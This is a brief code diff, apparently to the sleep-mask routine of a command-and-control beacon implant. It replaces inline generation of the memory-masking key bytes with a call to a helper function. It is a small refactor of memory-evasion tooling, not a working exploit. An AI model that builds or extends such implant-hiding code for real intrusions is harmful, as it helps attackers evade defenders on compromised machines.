@@ -330,7 +330,7 @@ void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD s
 	MEMORY_BASIC_INFORMATION mbi;
 	IMAGE_NT_HEADERS * nt;
 	IMAGE_SECTION_HEADER * sec;
-	int i, n, k;
+	int i, n;
 
 	if (info == NULL)
 		return;
@@ -341,12 +341,7 @@ void beacon_info_fill(BEACON_INFO * info, char * sm_base, DWORD sm_text, DWORD s
 	info->sleep_mask_total_size = sm_total != 0 ? sm_total : SLEEPMASK_REGION_PATCH;
 	info->beacon_ptr = (char *)base;
 	info->heap_records = track_memory_get_heap_records_to_mask();
-	if (gparms != NULL)
-		memcpy(info->mask, gparms->mask, MASK_SIZE);
-	else {
-		for (k = 0; k < MASK_SIZE; k++)
-			info->mask[k] = (char)bigger_rand();
-	}
+	gargle_mask_bytes(info->mask, MASK_SIZE);
 
 	reg = &info->allocatedMemory.AllocatedMemoryRegions[0];
 	reg->Purpose = AM_PURPOSE_BEACON_MEMORY;
